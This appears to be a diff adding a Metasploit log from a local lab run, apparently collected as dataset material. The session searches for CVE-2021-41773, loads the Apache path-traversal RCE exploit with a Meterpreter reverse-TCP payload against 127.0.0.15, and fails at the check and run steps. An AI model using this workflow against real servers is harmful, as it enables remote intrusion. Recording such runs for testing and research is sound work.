@@ -1,0 +1,36 @@
+[*] Spooling to file /home/kali/dataset/raw/metasploit/2026-08-04/apache_41773/scan.txt...
+resource (/tmp/apache.rc)> search cve:2021-41773
+
+Matching Modules
+================
+
+   #  Full Name                                     Disclosure Date  Rank       Check  Name
+   -  ---------                                     ---------------  ----       -----  ----
+   0  exploit/multi/http/apache_normalize_path_rce  2021-05-10       excellent  Yes    Apache 2.4.49/2.4.50 Traversal RCE
+   1    \_ target: Automatic (Dropper)              .                .          .      .
+   2    \_ target: Unix Command (In-Memory)         .                .          .      .
+   3  auxiliary/scanner/http/apache_normalize_path  2021-05-10       normal     No     Apache 2.4.49/2.4.50 Traversal RCE scanner
+   4    \_ action: CHECK_RCE                        .                .          .      Check for RCE (if mod_cgi is enabled).
+   5    \_ action: CHECK_TRAVERSAL                  .                .          .      Check for vulnerability.
+   6    \_ action: READ_FILE                        .                .          .      Read file on the remote server.
+
+
+Interact with a module by name or index. For example info 6, use 6 or use auxiliary/scanner/http/apache_normalize_path
+After interacting with a module you can manually set a ACTION with set ACTION 'READ_FILE'
+
+resource (/tmp/apache.rc)> use exploit/multi/http/apache_normalize_path_rce
+[*] Using configured payload linux/x64/meterpreter/reverse_tcp
+resource (/tmp/apache.rc)> set RHOSTS 127.0.0.15
+RHOSTS => 127.0.0.15
+resource (/tmp/apache.rc)> set RPORT 18081
+RPORT => 18081
+resource (/tmp/apache.rc)> set TARGETURI /
+TARGETURI => /
+resource (/tmp/apache.rc)> check
+[*] Using auxiliary/scanner/http/apache_normalize_path as check
+[*] Error: 127.0.0.15: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 peeraddr=127.0.0.15:18081 state=SSLv3/TLS write client hello: wrong version number
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] 127.0.0.15:18081 - This module does not support check. auxiliary/scanner/http/apache_normalize_path does not return a CheckCode.
+resource (/tmp/apache.rc)> run
+[-] Msf::OptionValidateError One or more options failed to validate: LHOST.
+resource (/tmp/apache.rc)> spool off
